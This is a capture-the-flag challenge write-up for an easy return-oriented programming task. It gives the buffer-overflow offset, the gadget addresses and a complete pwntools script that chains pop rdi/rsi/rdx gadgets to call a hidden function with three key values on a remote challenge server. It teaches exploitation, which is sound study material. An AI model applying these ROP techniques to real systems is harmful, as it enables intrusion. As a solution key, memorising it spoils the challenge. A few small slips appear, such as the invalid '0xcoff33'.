# Challenge Name
kidrop

## Learning Objective
Learn Return Oriented Programming (ROP).

## Description 
Let's find out the secrets to pwn...But I need 3 keys ;-;

## Difficulty:
easy

## Guide
Looking at the code, we have to use ret2win again for the uncalled `treasureChest` function. However, we have to fulfil the function arguments in order to call it.
`secretKey` function is also a red herring.
1. key1 = 0x13371337
2. key2 = 0xdeadbeef
3. key3 = 0xcoff33

We will instead do something called **Return Oriented Programming (ROP)**. ROP essentially uses the existing instructions/pieces of code in the program to help us craft our own payload. These pieces of code are also known as **gadgets**.

In x64, when function arguments are called, they are always placed in the registers first in the following order:
1. `rdi`
2. `rsi`
3. `rdx`
etc.

In this case, we need to use **3** arguments, so we need to use `rdi`, `rsi` & `rdx` registers.

What we need to find:
1. Offset required to BOF
2. Return address of `treasureChest` function
3. Gadgets required for the function arguments

### To find the offset needed:
1. Open program with pwndbg
```shell
$> gdb chall
```

2. Generate the cyclic pattern of 200 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite.
```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaa...
```

3. Run the program and paste when prompted
```shell
pwndbg> run
``` 

4. You should be able to observe this in the registers:
```shell
 RBP  0x6161616161616169 ('iaaaaaaa')
 RSP  0x7fffffffdc68 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa...
```

5. Let's find our offset:
```shell
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

### To find `treasureChest` function address:
```sh
$> objdump -d chall | grep treasureChest
0000000000400797 <treasureChest>:
...
```

### To find gadgets
For `rdi` register:
```sh
$> ROPgadget --binary chall | grep "pop rdi"
0x0000000000400963 : pop rdi ; ret
```

For `rsi` register:
```sh
$> ROPgadget --binary chall | grep "pop rsi"
0x0000000000400961 : pop rsi ; pop r15 ; ret
```

For `rdx` register:
```sh
$> ROPgadget --binary chall | grep ": pop rdx"
0x0000000000400867 : pop rdx ; ret
```

We can see that the `rsi` gadget has `pop r15` as well. We do not need this for the exploit but we have to fill it up with a redundant value so that it does not affect our ROP chain.

### Assembling our exploit
Before we return to the `treasureChest` function, we want to prepare the registers first so that the function will take argument values from the registers accordingly. Our payload will then look something like this:

1. padding
2. pop rdi address + key1 (0x13371337)
3. pop rsi address + key2 (0xdeadbeef) + redundent value (0)
4. pop rdx address + key3 (0xcoff33)
5. return address of `treasureChest` function

### Final solution
```py
from pwn import *

# setup process
p = remote("SERVER", PORT)

# ROP gadgets
pop_rdi = 0x400963 # pop rdi
pop_rsi = 0x400961 # pop rsi, pop r15
pop_rdx = 0x400867 # pop rdx 

# address of treasureChest 
win = 0x400797

# offset
payload = b'A' * 72

# ---------------------- ROP chain ---------------------------
# pop rdi + key1
# pop rsi + key2 + 0 (no need for r15)
# pop rdx + key3
# address of treasureChest
payload += p64(pop_rdi) + p64(0x13371337)
payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
payload += p64(pop_rdx) + p64(0xc0ff33)
payload += p64(win)

# send and receive output
p.sendline(payload)
p.interactive()
```

## Solution
Refer to solve.py

## Hints
1. x64 function calling convention
2. How many arguements do you need? Which registers do you need?
3. Consider the order of your ROP chain. (What must go in first?)

## Attached Files
- chall.c
- chall

## Resources
- https://ctf101.org/binary-exploitation/what-are-calling-conventions/
- https://ctf101.org/binary-exploitation/return-oriented-programming/
- https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html


## Flag
TBD